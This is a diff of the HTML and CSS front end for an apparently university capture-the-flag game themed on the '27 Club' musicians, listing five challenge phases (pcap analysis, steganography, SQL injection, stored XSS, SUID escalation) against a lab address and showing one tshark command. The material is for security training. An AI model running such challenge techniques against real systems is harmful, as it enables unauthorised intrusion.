+      background: linear-gradient(90deg, #444, #ddd 50%, #666);
+      box-shadow: 0 1px 2px rgba(0,0,0,0.8);
+    }
+    .fret-string.s1 { top: 18%; height: 1px; }
+    .fret-string.s2 { top: 30%; height: 1px; }
+    .fret-string.s3 { top: 43%; height: 1.5px; }
+    .fret-string.s4 { top: 56%; height: 1.8px; }
+    .fret-string.s5 { top: 69%; height: 2.2px; }
+    .fret-string.s6 { top: 82%; height: 2.6px; }
+
+    /* Fret Slots (0 to 27) */
+    .fret-unit {
       flex: 1;
       height: 100%;
-      border-right: 2px solid #5a5f66; /* Nickel fret wire */
+      border-right: 2px solid #5d636b; /* Nickel Fret Wire */
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -675,42 +637,26 @@
       cursor: pointer;
       transition: background 0.2s ease;
     }
-    .fret-strip-item:hover {
-      background: rgba(255, 183, 3, 0.15);
+    .fret-unit:hover {
+      background: rgba(255, 183, 3, 0.18);
     }
-    .fret-strip-item.nut-fret {
-      flex: 0.8;
-      border-right: 4px solid #f4ece1; /* Bone nut */
+    .fret-unit.nut-fret {
+      flex: 0.9;
+      border-right: 4px solid #f4ece1; /* Bone Nut */
       background: #0f0a07;
     }
-    .fret-strip-item.milestone-fret {
+    .fret-unit.milestone-fret {
       background: rgba(197, 160, 89, 0.12);
       border-right-color: var(--brass-gold);
     }
-    .fret-strip-item.unlocked-fret {
-      background: rgba(255, 183, 3, 0.22);
+    .fret-unit.unlocked-fret {
+      background: rgba(255, 183, 3, 0.25);
     }
-    .fret-strip-item.active-fret {
-      background: rgba(255, 183, 3, 0.4);
+    .fret-unit.active-fret {
+      background: rgba(255, 183, 3, 0.45);
     }
 
-    /* Strings running horizontally through the macro bar */
-    .macro-string {
-      position: absolute;
-      left: 0; right: 0;
-      height: 1px;
-      background: linear-gradient(90deg, #555, #ccc, #888);
-      pointer-events: none;
-      z-index: 2;
-    }
-    .macro-string.s1 { top: 20%; height: 1px; }
-    .macro-string.s2 { top: 32%; height: 1px; }
-    .macro-string.s3 { top: 44%; height: 1.5px; }
-    .macro-string.s4 { top: 56%; height: 1.5px; }
-    .macro-string.s5 { top: 68%; height: 2px; }
-    .macro-string.s6 { top: 80%; height: 2.5px; }
-
-    .fret-number-lbl {
+    .fret-num-text {
       position: absolute;
       bottom: 2px;
       font-family: 'Fira Code', monospace;
@@ -719,275 +665,58 @@
       color: var(--text-muted);
       z-index: 5;
     }
-    .milestone-icon {
+    .milestone-star {
       position: absolute;
-      top: 3px;
+      top: 2px;
       font-size: 10px;
       z-index: 5;
     }
 
-    /* Macro Slide Indicator */
-    #macro-slide-pill {
+    /* THE CHROME STEEL BOTTLENECK SLIDE ON THE DIAPASÓN */
+    #diapason-slide {
       position: absolute;
-      top: 10%;
-      bottom: 10%;
-      width: 14px;
-      margin-left: -7px;
+      top: 8%;
+      bottom: 8%;
+      width: 16px;
+      margin-left: -8px;
       border-radius: 4px;
-      background: linear-gradient(90deg, #3a4249 0%, #a0aab2 20%, #ffffff 50%, #828d97 80%, #25292e 100%);
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.9), 0 2px 6px rgba(0,0,0,0.8);
-      z-index: 10;
+      background: linear-gradient(90deg, 
+        #1f2429 0%, 
+        #7a8288 20%, 
+        #ffffff 50%, 
+        #e0e5eb 55%, 
+        #858f96 80%, 
+        #2a3138 100%
+      );
+      box-shadow: 
+        0 0 16px rgba(255, 255, 255, 0.9), 
+        0 4px 8px rgba(0, 0, 0, 0.9),
+        inset 0 1px 2px #fff,
+        inset 0 -1px 2px #000;
+      z-index: 20;
       pointer-events: none;
       transition: left 0.75s cubic-bezier(0.25, 1, 0.5, 1);
     }
-
-    /* TACTICAL ATTACK DRAWER (LEFT SIDEBAR) */
-    #attack-drawer {
+    #diapason-slide::after {
+      content: "";
       position: absolute;
-      top: 60px;
-      left: -440px;
-      width: 440px;
-      bottom: 80px;
-      background: linear-gradient(180deg, rgba(20, 14, 10, 0.98) 0%, rgba(12, 8, 5, 0.98) 100%);
-      border-right: 2px solid var(--brass-gold);
-      box-shadow: 8px 0 35px rgba(0,0,0,0.9);
-      z-index: 110;
-      transition: left 0.4s cubic-bezier(0.2, 0.8, 0.2, 1);
-      display: flex;
-      flex-direction: column;
-      backdrop-filter: blur(10px);
-    }
-    #attack-drawer.open { left: 0; }
-
-    .drawer-header {
-      padding: 14px 18px;
-      border-bottom: 1px solid rgba(197, 160, 89, 0.3);
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      background: rgba(10, 7, 5, 0.6);
-    }
-    .drawer-header h2 {
-      font-family: 'Permanent Marker', cursive;
-      font-size: 17px;
-      color: var(--brass-light);
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .drawer-close-btn {
-      background: transparent;
-      border: 1px solid var(--brass-gold);
-      color: var(--brass-light);
-      width: 26px;
-      height: 26px;
-      border-radius: 4px;
-      cursor: pointer;
-      font-weight: 700;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: all 0.2s;
-    }
-    .drawer-close-btn:hover { background: var(--brass-gold); color: #000; }
-
-    .drawer-content {
-      flex: 1;
-      overflow-y: auto;
-      padding: 16px 18px;
-      display: flex;
-      flex-direction: column;
-      gap: 14px;
-    }
-    .drawer-content::-webkit-scrollbar { width: 6px; }
-    .drawer-content::-webkit-scrollbar-thumb { background: var(--brass-gold); border-radius: 3px; }
-
-    .target-card {
-      background: rgba(10, 7, 5, 0.85);
-      border: 1px solid rgba(197, 160, 89, 0.25);
-      border-radius: 6px;
-      padding: 12px;
-    }
-    .artist-hero-row {
-      display: flex;
-      gap: 12px;
-      margin-bottom: 10px;
-    }
-    .artist-hero-photo {
-      width: 70px;
-      height: 70px;
-      border-radius: 6px;
-      object-fit: cover;
-      border: 2px solid var(--brass-gold);
-      box-shadow: 0 2px 8px rgba(0,0,0,0.8);
-    }
-    .artist-hero-info {
-      flex: 1;
-    }
-    .artist-hero-info h3 {
-      font-family: 'Permanent Marker', cursive;
-      font-size: 16px;
-      color: var(--amber-bright);
-    }
-    .artist-hero-info .phase-badge {
-      display: inline-block;
-      font-family: 'Fira Code', monospace;
-      font-size: 10px;
-      color: var(--brass-light);
-      background: rgba(197, 160, 89, 0.15);
-      border: 1px solid var(--brass-gold);
-      padding: 2px 6px;
-      border-radius: 3px;
-      margin-top: 3px;
+      top: 4px;
+      left: 6px;
+      width: 4px;
+      bottom: 4px;
+      background: #fff;
+      border-radius: 2px;
+      filter: blur(0.5px);
+      opacity: 0.9;
     }
 
-    .meta-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 8px;
-      margin-bottom: 10px;
-    }
-    .meta-box {
-      background: rgba(0,0,0,0.4);
-      padding: 6px 8px;
-      border-radius: 4px;
-      border-left: 2px solid var(--brass-gold);
-    }
-    .meta-box .lbl {
-      font-size: 9px;
-      color: var(--text-muted);
-      text-transform: uppercase;
-      font-weight: 700;
-    }
-    .meta-box .val {
-      font-family: 'Fira Code', monospace;
-      font-size: 11px;
-      color: var(--aged-paper);
-      margin-top: 2px;
-    }
-
-    .kali-terminal-box {
-      background: #060a06;
-      border: 1px solid rgba(51, 255, 51, 0.35);
-      border-radius: 4px;
-      padding: 10px;
-      font-family: 'Fira Code', monospace;
-      font-size: 11px;
-      color: #99ff99;
-      position: relative;
-    }
-    .kali-terminal-box code {
-      color: #33ff33;
-      word-break: break-all;
-    }
-
-    /* INYECCIÓN DE BANDERA */
-    .flag-submission-box {
-      background: rgba(15, 10, 7, 0.95);
-      border: 1px solid var(--brass-gold);
-      border-radius: 6px;
-      padding: 14px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.7);
-    }
-    .flag-submission-box h4 {
-      font-family: 'Permanent Marker', cursive;
-      font-size: 14px;
-      color: var(--brass-light);
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .flag-input-group {
-      display: flex;
-      gap: 8px;
-    }
-    .flag-input-group input {
-      flex: 1;
-      background: #000;
-      border: 1px solid var(--brass-gold);
-      color: var(--amber-bright);
-      font-family: 'Fira Code', monospace;
-      font-size: 12px;
-      padding: 8px 10px;
-      border-radius: 4px;
-      outline: none;
-      transition: border-color 0.2s;
-    }
-    .flag-input-group input:focus {
-      border-color: var(--amber-bright);
-      box-shadow: 0 0 10px rgba(255, 183, 3, 0.4);
-    }
-    .btn-submit-flag {
-      background: linear-gradient(180deg, var(--amber-bright) 0%, #c48200 100%);
-      border: none;
-      color: #000;
-      font-family: 'Rajdhani', sans-serif;
-      font-weight: 700;
-      font-size: 13px;
-      padding: 0 16px;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-    .btn-submit-flag:hover {
-      box-shadow: 0 0 12px rgba(255, 183, 3, 0.7);
-      transform: translateY(-1px);
-    }
-
-    .flag-feedback {
-      margin-top: 8px;
-      font-family: 'Fira Code', monospace;
-      font-size: 11px;
-      padding: 6px 8px;
-      border-radius: 4px;
-      display: none;
-      line-height: 1.3;
-    }
-    .flag-feedback.success {
-      display: block;
-      background: rgba(88, 129, 87, 0.25);
-      border: 1px solid var(--success-olive);
-      color: #a3e635;
-    }
-    .flag-feedback.error {
-      display: block;
-      background: rgba(158, 42, 43, 0.25);
-      border: 1px solid var(--danger-rust);
-      color: #f87171;
-    }
-
-    /* Quick Phase Nav Buttons */
-    .drawer-phase-nav {
-      display: flex;
-      gap: 6px;
-      margin-top: 10px;
-    }
-    .btn-phase-tab {
-      flex: 1;
-      background: rgba(0,0,0,0.5);
-      border: 1px solid rgba(197, 160, 89, 0.3);
-      color: var(--text-muted);
-      font-family: 'Fira Code', monospace;
-      font-size: 11px;
-      padding: 6px 0;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-    .btn-phase-tab:hover, .btn-phase-tab.active {
-      border-color: var(--amber-bright);
-      color: var(--brass-light);
-      background: rgba(197, 160, 89, 0.15);
-    }
-
-    /* POPUP NOTIFICATION BANNER */
+    /* TOAST NOTIFICATION */
     #rock-toast {
       position: absolute;
-      top: 75px;
+      top: 70px;
       left: 50%;
       transform: translateX(-50%) translateY(-30px);
-      background: rgba(10, 7, 5, 0.95);
+      background: rgba(12, 8, 6, 0.96);
       border: 2px solid var(--amber-bright);
       box-shadow: 0 0 30px rgba(255, 183, 3, 0.5), 0 8px 25px rgba(0,0,0,0.9);
       padding: 12px 24px;
@@ -1004,16 +733,13 @@
       opacity: 1;
       transform: translateX(-50%) translateY(0);
     }
-    #rock-toast .toast-icon { font-size: 24px; }
-    #rock-toast .toast-title {
+    #rock-toast .icon { font-size: 24px; }
+    #rock-toast .title {
       font-family: 'Permanent Marker', cursive;
       font-size: 16px;
       color: var(--amber-bright);
     }
-    #rock-toast .toast-desc {
-      font-size: 12px;
-      color: var(--aged-paper);
-    }
+    #rock-toast .desc { font-size: 12px; color: var(--aged-paper); }
 
     /* SUSTENTACIÓN MODAL */
     #modal-sustentacion {
@@ -1058,18 +784,6 @@
       font-size: 12px;
     }
     .modal-item strong { color: var(--brass-light); }
-    .modal-close-btn {
-      align-self: center;
-      background: var(--brass-gold);
-      border: none;
-      color: #000;
-      font-family: 'Rajdhani', sans-serif;
-      font-weight: 700;
-      font-size: 14px;
-      padding: 8px 24px;
-      border-radius: 4px;
-      cursor: pointer;
-    }
   </style>
 </head>
 <body>
@@ -1077,250 +791,231 @@
   <!-- TOP MASTER STUDIO CONSOLE HUD -->
   <header id="top-hud">
     <div class="brand-section">
-      <div class="brand-logo-disc"></div>
+      <div class="brand-disc"></div>
       <div class="brand-titles">
         <h1>THE 27 CLUB CTF</h1>
-        <div class="sub-title">Vintage Rock Room • Slide Highway</div>
+        <div class="sub">Vintage Rock Studio & Slide Highway • Universidad de Cundinamarca</div>
       </div>
     </div>
 
     <!-- Telemetry -->
-    <div class="telemetry-bar">
-      <div class="telem-item">
+    <div class="telemetry-row">
+      <div class="telem-box">
         <span class="telem-lbl">Posición Mástil</span>
         <span class="telem-val accent" id="hud-fret-pos">TRASTE 0 (NUT)</span>
       </div>
-      <div class="telem-item">
-        <span class="telem-lbl">Artista Activo</span>
-        <span class="telem-val" id="hud-artist">HENDRIX (FASE 1)</span>
+      <div class="telem-box">
+        <span class="telem-lbl">Fase Activa</span>
+        <span class="telem-val" id="hud-artist">1. HENDRIX</span>
       </div>
-      <div class="telem-item">
+      <div class="telem-box">
         <span class="telem-lbl">Puntaje</span>
         <span class="telem-val accent" id="hud-score">0 PTS</span>
       </div>
-      <div class="telem-item">
+      <div class="telem-box">
         <span class="telem-lbl">Banderas</span>
         <span class="telem-val" id="hud-flags">0 / 5</span>
       </div>
     </div>
 
     <!-- Audio Player State -->
-    <div class="audio-telemetry">
+    <div class="audio-now-playing">
       <div class="eq-bars" id="audio-eq">
         <div class="eq-bar"></div>
         <div class="eq-bar"></div>
         <div class="eq-bar"></div>
         <div class="eq-bar"></div>
       </div>
-      <span class="track-name" id="hud-track-title">Sin Reproducción</span>
-      <button id="btn-toggle-sound" class="btn-action" style="padding:2px 7px; font-size:10px;">🔊 MUTE</button>
-    </div>
-
-    <!-- Camera View Switcher -->
-    <div class="view-switcher">
-      <button class="btn-view active" onclick="switchCameraView('room')">📻 HABITACIÓN</button>
-      <button class="btn-view" onclick="switchCameraView('fret')">🎸 ENFOCAR MÁSTIL</button>
-      <button class="btn-view" onclick="switchCameraView('tv')">📺 MONITOR KALI</button>
-      <button class="btn-view" onclick="switchCameraView('turntable')">🎵 TOCADISCOS</button>
+      <span class="track-title" id="hud-track-title">Sin Reproducción</span>
+      <button id="btn-toggle-sound" class="btn-top" style="padding:2px 7px; font-size:10px;">🔊 MUTE</button>
     </div>
 
     <!-- Actions -->
-    <div class="hud-actions">
-      <button class="btn-action" onclick="toggleAttackDrawer()">📁 DOSSIER ATAQUE</button>
-      <button class="btn-action demo-btn" onclick="openSustentacionModal()">🎓 SUSTENTACIÓN</button>
-      <button class="btn-action" onclick="resetCTFProgress()" title="Reiniciar">🔄</button>
+    <div style="display:flex; gap:8px;">
+      <button class="btn-top accent" onclick="openSustentacionModal()">🎓 SUSTENTACIÓN</button>
+      <button class="btn-top" onclick="resetCTFProgress()" title="Reiniciar">🔄 REINICIAR</button>
     </div>
   </header>
 
-  <!-- MASTER STAGE VIEWPORT (REAL PHOTOGRAPH + INTERACTIVE GLISSANDO SLIDE) -->
-  <main id="stage-viewport">
-    <div id="stage-canvas-wrap">
-      <!-- High Resolution Real Rock Bedroom Photograph -->
-      <img id="master-photo" src="assets/images/rock_bedroom_bg.jpg" alt="Vintage Rock Bedroom 80s" />
+  <!-- MAIN WORKSPACE -->
+  <main id="main-workspace">
+    <!-- LEFT: 100% CLEAN & UNCLUTTERED VINTAGE ROCK BEDROOM PHOTOGRAPH -->
+    <div id="room-pane">
+      <img id="clean-room-image" src="assets/images/rock_bedroom_bg.jpg" alt="Vintage 80s Rock Bedroom" />
+      <div id="room-vignette"></div>
 
-      <!-- Cinematic Ambient Lighting Filter -->
-      <div id="lighting-overlay"></div>
-
-      <!-- GUITAR NECK INTERACTIVE LAYER (27 FRETS + REAL CHROME SLIDE) -->
-      <div id="neck-overlay">
-        <!-- 28 Frets (0 = Nut, 1 to 27) generated dynamically -->
-        <div id="fret-nodes-container"></div>
-
-        <!-- The Chrome Steel Bottleneck Slide -->
-        <div id="chrome-slide"></div>
-        <div id="slide-glow"></div>
-      </div>
-
-      <!-- REAL 12" VINYL SLEEVES & ALBUM COVERS ON THE BED (THE 5 SANCTUARIES) -->
-      <!-- 1. JIMI HENDRIX (Upper Left Bed near Headstock) -->
-      <div class="vinyl-sleeve-card active-phase" id="sleeve-phase-1" style="left: 65px; top: 18px; width: 130px; height: 130px; transform: rotate(-8deg);" onclick="selectPhase(1)" title="Fase 1: Jimi Hendrix - Are You Experienced">
-        <div class="vinyl-disc-peeking">
-          <div class="disc-label" style="background-image: url('assets/images/hendrix_album.jpg');"></div>
-        </div>
-        <div class="sleeve-jacket">
-          <img src="assets/images/hendrix_album.jpg" class="album-cover-img" alt="Jimi Hendrix">
-          <div class="ring-wear-effect"></div>
-          <div class="sleeve-status-ribbon">F1 • HENDRIX (TRASTE 6)</div>
-        </div>
-      </div>
-
-      <!-- 2. JANIS JOPLIN (Upper Bed Pillow / Left of Turntable) -->
-      <div class="vinyl-sleeve-card" id="sleeve-phase-2" style="left: 195px; top: 305px; width: 120px; height: 120px; transform: rotate(10deg);" onclick="selectPhase(2)" title="Fase 2: Janis Joplin - Pearl">
-        <div class="vinyl-disc-peeking">
-          <div class="disc-label" style="background-image: url('assets/images/joplin_album.jpg');"></div>
-        </div>
-        <div class="sleeve-jacket">
-          <img src="assets/images/joplin_album.jpg" class="album-cover-img" alt="Janis Joplin">
-          <div class="ring-wear-effect"></div>
-          <div class="sleeve-status-ribbon">F2 • JOPLIN (TRASTE 11)</div>
-        </div>
-      </div>
-
-      <!-- 3. JIM MORRISON (Upper Right Bed near Fender Amp) -->
-      <div class="vinyl-sleeve-card" id="sleeve-phase-3" style="left: 635px; top: 175px; width: 145px; height: 145px; transform: rotate(-14deg);" onclick="selectPhase(3)" title="Fase 3: Jim Morrison - The Doors">
-        <div class="vinyl-disc-peeking">
-          <div class="disc-label" style="background-image: url('assets/images/morrison_album.jpg');"></div>
-        </div>
-        <div class="sleeve-jacket">
-          <img src="assets/images/morrison_album.jpg" class="album-cover-img" alt="Jim Morrison">
-          <div class="ring-wear-effect"></div>
-          <div class="sleeve-status-ribbon">F3 • MORRISON (TRASTE 16)</div>
-        </div>
-      </div>
-
-      <!-- 4. AMY WINEHOUSE (Lower Center Bed Sleeve - Highlighted in User Screenshot) -->
-      <div class="vinyl-sleeve-card" id="sleeve-phase-4" style="left: 415px; top: 430px; width: 155px; height: 155px; transform: rotate(-16deg);" onclick="selectPhase(4)" title="Fase 4: Amy Winehouse - Back To Black">
-        <div class="vinyl-disc-peeking">
-          <div class="disc-label" style="background-image: url('assets/images/winehouse_album.jpg');"></div>
-        </div>
-        <div class="sleeve-jacket">
-          <img src="assets/images/winehouse_album.jpg" class="album-cover-img" alt="Amy Winehouse">
-          <div class="ring-wear-effect"></div>
-          <div class="sleeve-status-ribbon">F4 • WINEHOUSE (TRASTE 21)</div>
-        </div>
-      </div>
-
-      <!-- 5. KURT COBAIN (Turntable / Nightstand) -->
-      <div class="vinyl-sleeve-card" id="sleeve-phase-5" style="left: 360px; top: 120px; width: 110px; height: 110px; transform: rotate(4deg);" onclick="selectPhase(5)" title="Fase 5: Kurt Cobain - Nevermind">
-        <div class="vinyl-disc-peeking">
-          <div class="disc-label" style="background-image: url('assets/images/cobain_album.jpg');"></div>
-        </div>
-        <div class="sleeve-jacket">
-          <img src="assets/images/cobain_album.jpg" class="album-cover-img" alt="Kurt Cobain">
-          <div class="ring-wear-effect"></div>
-          <div class="sleeve-status-ribbon">F5 • COBAIN (ROOT - T27)</div>
-        </div>
-      </div>
-
-      <!-- TURNTABLE HOTSPOT ON DRESSER (KURT COBAIN FASE 5) -->
-      <div id="turntable-hotspot" onclick="selectPhase(5)" title="Fase 5: Kurt Cobain (Tocadiscos)"></div>
-
-      <!-- FENDER AMP & PILOT LIGHT -->
-      <div id="amp-hotspot" onclick="testAmpFeedback()" title="Fender Amp (Amplificador a Válvulas)"></div>
-      <div id="fender-pilot-light"></div>
-
-      <!-- VINTAGE CRT TV HOTSPOT & LIVE SCREEN -->
-      <div id="crt-hotspot" onclick="switchCameraView('tv')" title="Monitor CRT Kali Linux"></div>
-      <div id="crt-screen-overlay">
-        <div class="crt-mini-text">> KALI_CTF v2.7</div>
-        <div class="crt-mini-text" id="crt-phase-target">> TARGET: 192.168.56.1</div>
-        <div class="crt-mini-text" id="crt-cwe">> CWE-311 (PCAP)</div>
-        <div class="crt-mini-text">> INJECT FLAG...<span class="crt-blink-cursor"></span></div>
-      </div>
+      <!-- Fender Amp Interactive Sound Jewel Trigger -->
+      <div id="room-amp-clicker" onclick="testAmpFeedback()" title="Fender Amp (Amplificador a Válvulas)"></div>
+      <div id="amp-jewel-lamp"></div>
     </div>
+
+    <!-- RIGHT: STRATEGIC STUDIO RACK (CRT KALI MONITOR + 5 VINYL SANCTUARIES) -->
+    <aside id="studio-rack-pane">
+      <!-- 1. STRATEGIC CRT KALI MONITOR -->
+      <div id="crt-monitor-section">
+        <div class="crt-monitor-housing">
+          <div class="crt-header-line">
+            <span class="crt-title">> KALI LINUX TERMINAL [DOCKER]</span>
+            <span class="crt-live-badge">ONLINE</span>
+          </div>
+
+          <div class="crt-body">
+            <div class="crt-row">
+              <span class="crt-lbl">TARGET:</span>
+              <span class="crt-val" id="crt-target-ip">192.168.56.1 (Puerto 80 HTTP)</span>
+            </div>
+            <div class="crt-row">
+              <span class="crt-lbl">VECTOR:</span>
+              <span class="crt-val" id="crt-vector">PCAP DPI / User-Agent Header</span>
+            </div>
+            <div class="crt-row">
+              <span class="crt-lbl">ESTÁNDAR:</span>
+              <span class="crt-val" id="crt-cwe">ROT13 / CWE-311</span>
+            </div>
+            <div class="crt-row" style="flex-direction:column; gap:2px; margin-top:2px;">
+              <span class="crt-lbl">COMANDO KALI:</span>
+              <span class="crt-val code" id="crt-command">tshark -r jimi_hendrix.pcap -Y "http.request" -T fields -e http.user_agent | tr 'A-Za-z' 'N-ZA-Mn-za-m'</span>
+            </div>
+          </div>
+
+          <!-- Flag Input Form -->
+          <div class="crt-flag-form">
+            <div style="font-family:'VT323',monospace; font-size:16px; color:#88ff88;">
+              > INYECTAR BANDERA CAPTURADA EN KALI:
+            </div>
+            <div class="flag-terminal-input-wrap">
+              <input type="text" id="flag-input" class="flag-terminal-input" placeholder="FLAG{...}" autocomplete="off" spellcheck="false" onkeydown="if(event.key==='Enter') submitFlag()">
+              <button class="btn-crt-submit" onclick="submitFlag()">VALIDAR</button>
+            </div>
+            <div id="crt-feedback" class="crt-feedback-msg"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- 2. THE 5 VINYL SANCTUARIES SHOWCASE -->
+      <div id="vinyl-showcase-section">
+        <div class="showcase-header">
+          <h2>🎵 SANTUARIOS DEL CLUB DE LOS 27 (DISCOS REVELADOS)</h2>
+          <span class="count" id="showcase-counter">0 / 5 RESUELTOS</span>
+        </div>
+
+        <!-- 5 Vinyl Slot Cards (Covers reveal upon flag discovery) -->
+        <!-- Slot 1: Hendrix -->
+        <div class="sanctuary-slot-card active" id="slot-phase-1" onclick="selectPhase(1)">
+          <div class="slot-jacket-art locked" id="jacket-1">
+            <img src="assets/images/hendrix_album.jpg" alt="Jimi Hendrix">
+            <div class="slot-lock-icon">🔒</div>
+          </div>
+          <div class="slot-spinning-disc"></div>
+          <div class="slot-info-box">
+            <div class="slot-title-row">
+              <span class="slot-artist-name">1. Jimi Hendrix</span>
+              <span class="slot-traste-tag">TRASTE 6 • 150 PTS</span>
+            </div>
+            <div class="slot-track-title" id="slot-track-1">Are You Experienced • Purple Haze</div>
+            <div class="slot-vector-cwe">PCAP DPI • CWE-311</div>
+          </div>
+        </div>
+
+        <!-- Slot 2: Joplin -->
+        <div class="sanctuary-slot-card" id="slot-phase-2" onclick="selectPhase(2)">
+          <div class="slot-jacket-art locked" id="jacket-2">
+            <img src="assets/images/joplin_album.jpg" alt="Janis Joplin">
+            <div class="slot-lock-icon">🔒</div>
+          </div>
+          <div class="slot-spinning-disc"></div>
+          <div class="slot-info-box">
+            <div class="slot-title-row">
+              <span class="slot-artist-name">2. Janis Joplin</span>
+              <span class="slot-traste-tag">TRASTE 11 • 200 PTS</span>
+            </div>
+            <div class="slot-track-title" id="slot-track-2">Pearl • Cry Baby</div>
+            <div class="slot-vector-cwe">Esteganografía EOF • CWE-200</div>
+          </div>
+        </div>
+
+        <!-- Slot 3: Morrison -->
+        <div class="sanctuary-slot-card" id="slot-phase-3" onclick="selectPhase(3)">
+          <div class="slot-jacket-art locked" id="jacket-3">
+            <img src="assets/images/morrison_album.jpg" alt="Jim Morrison">
+            <div class="slot-lock-icon">🔒</div>
+          </div>
+          <div class="slot-spinning-disc"></div>
+          <div class="slot-info-box">
+            <div class="slot-title-row">
+              <span class="slot-artist-name">3. Jim Morrison</span>
+              <span class="slot-traste-tag">TRASTE 16 • 250 PTS</span>
+            </div>
+            <div class="slot-track-title" id="slot-track-3">The Doors • Light My Fire</div>
+            <div class="slot-vector-cwe">SQL Injection UNION • CWE-89</div>
+          </div>
+        </div>
+
+        <!-- Slot 4: Amy Winehouse -->
+        <div class="sanctuary-slot-card" id="slot-phase-4" onclick="selectPhase(4)">
+          <div class="slot-jacket-art locked" id="jacket-4">
+            <img src="assets/images/winehouse_album.jpg" alt="Amy Winehouse">
+            <div class="slot-lock-icon">🔒</div>
+          </div>
+          <div class="slot-spinning-disc"></div>
+          <div class="slot-info-box">
+            <div class="slot-title-row">
+              <span class="slot-artist-name">4. Amy Winehouse</span>
+              <span class="slot-traste-tag">TRASTE 21 • 200 PTS</span>
+            </div>
+            <div class="slot-track-title" id="slot-track-4">Back To Black • Title Track</div>
+            <div class="slot-vector-cwe">Stored XSS • CWE-79</div>
+          </div>
+        </div>
+
+        <!-- Slot 5: Kurt Cobain -->
+        <div class="sanctuary-slot-card" id="slot-phase-5" onclick="selectPhase(5)">
+          <div class="slot-jacket-art locked" id="jacket-5">
+            <img src="assets/images/cobain_album.jpg" alt="Kurt Cobain">
+            <div class="slot-lock-icon">🔒</div>
+          </div>
+          <div class="slot-spinning-disc"></div>
+          <div class="slot-info-box">
+            <div class="slot-title-row">
+              <span class="slot-artist-name">5. Kurt Cobain (ROOT)</span>
+              <span class="slot-traste-tag">TRASTE 27 • 200 PTS</span>
+            </div>
+            <div class="slot-track-title" id="slot-track-5">Nevermind • Smells Like Teen Spirit</div>
+            <div class="slot-vector-cwe">SUID / GTFOBins Escalation • CWE-250</div>
+          </div>
+        </div>
+      </div>
+    </aside>
   </main>
 
-  <!-- BOTTOM MACRO FRETBOARD HIGHWAY (ALL 27 FRETS WITH SLIDE GLISSANDO) -->
-  <footer id="bottom-macro-bar">
-    <div class="macro-bar-header">
-      <span class="title">🎸 DIAPASÓN VINTAGE DE 27 TRASTES (CLICK EN CUALQUIER TRASTE O INYECTA LA BANDERA)</span>
-      <span id="macro-status-text">AVANCE AUTOMÁTICO EXCLUSIVAMENTE POR BANDERAS CAPTURADAS</span>
+  <!-- BOTTOM INTERACTIVE MACRO DIAPASÓN HIGHWAY -->
+  <footer id="bottom-macro-fretboard">
+    <div class="fret-bar-top-info">
+      <span class="brand">🎸 DIAPASÓN DE 27 TRASTES & SLIDE CROMADO (EL SLIDE AVANZA AL INYECTAR LA BANDERA REAL DE KALI)</span>
+      <span id="fret-status-lbl">PUNTO DE PARTIDA: TRASTE 0 (NUT)</span>
     </div>
-    <div class="fretboard-strip" id="macro-fretboard-strip">
-      <!-- 6 Guitar Strings -->
-      <div class="macro-string s1"></div>
-      <div class="macro-string s2"></div>
-      <div class="macro-string s3"></div>
-      <div class="macro-string s4"></div>
-      <div class="macro-string s5"></div>
-      <div class="macro-string s6"></div>
+    <div class="diapason-strip" id="diapason-strip">
+      <!-- 6 Real Strings -->
+      <div class="fret-string s1"></div>
+      <div class="fret-string s2"></div>
+      <div class="fret-string s3"></div>
+      <div class="fret-string s4"></div>
+      <div class="fret-string s5"></div>
+      <div class="fret-string s6"></div>
 
-      <!-- Chrome Slide Pill Indicator in Macro Bar -->
-      <div id="macro-slide-pill"></div>
+      <!-- The Real Polished Chrome Slide Indicator -->
+      <div id="diapason-slide"></div>
 
-      <!-- 28 Frets injected via JS -->
+      <!-- 28 Frets (0 = Nut, 1 to 27) generated dynamically -->
     </div>
   </footer>
 
-  <!-- TACTICAL ATTACK DRAWER -->
-  <aside id="attack-drawer">
-    <div class="drawer-header">
-      <h2>📁 DOSSIER DE ATAQUE KALI LINUX</h2>
-      <button class="drawer-close-btn" onclick="toggleAttackDrawer()">✕</button>
-    </div>
-
-    <!-- Quick Phase Tabs -->
-    <div class="drawer-phase-nav" style="padding: 0 18px;">
-      <button class="btn-phase-tab active" id="tab-p1" onclick="selectPhase(1)">1. HENDRIX</button>
-      <button class="btn-phase-tab" id="tab-p2" onclick="selectPhase(2)">2. JOPLIN</button>
-      <button class="btn-phase-tab" id="tab-p3" onclick="selectPhase(3)">3. MORRISON</button>
-      <button class="btn-phase-tab" id="tab-p4" onclick="selectPhase(4)">4. AMY</button>
-      <button class="btn-phase-tab" id="tab-p5" onclick="selectPhase(5)">5. COBAIN</button>
-    </div>
-
-    <div class="drawer-content">
-      <div class="target-card">
-        <div class="artist-hero-row">
-          <img id="drawer-photo" src="assets/images/hendrix_photo.jpg" class="artist-hero-photo" alt="Artista">
-          <div class="artist-hero-info">
-            <h3 id="drawer-title">Fase 1: Jimi Hendrix</h3>
-            <span class="phase-badge" id="drawer-traste-badge">TRASTE 6 • 150 PTS</span>
-            <div style="font-size:11px; color:var(--text-muted); margin-top:4px;" id="drawer-sub">Electric Church Studios</div>
-          </div>
-        </div>
-
-        <div class="meta-grid">
-          <div class="meta-box">
-            <div class="lbl">Vector de Ataque</div>
-            <div class="val" id="drawer-vector">PCAP DPI / User-Agent</div>
-          </div>
-          <div class="meta-box">
-            <div class="lbl">Estándar CWE</div>
-            <div class="val" id="drawer-cwe">ROT13 / CWE-311</div>
-          </div>
-          <div class="meta-box" style="grid-column: span 2;">
-            <div class="lbl">Objetivo / Contenedor</div>
-            <div class="val" id="drawer-target">192.168.56.1 (Puerto 80 HTTP)</div>
-          </div>
-        </div>
-
-        <div class="lbl" style="margin-bottom:4px; font-weight:700; color:var(--brass-light); font-size:10px;">GUÍA KALI LINUX & COMANDO SUGERIDO:</div>
-        <div class="kali-terminal-box" id="drawer-kali">
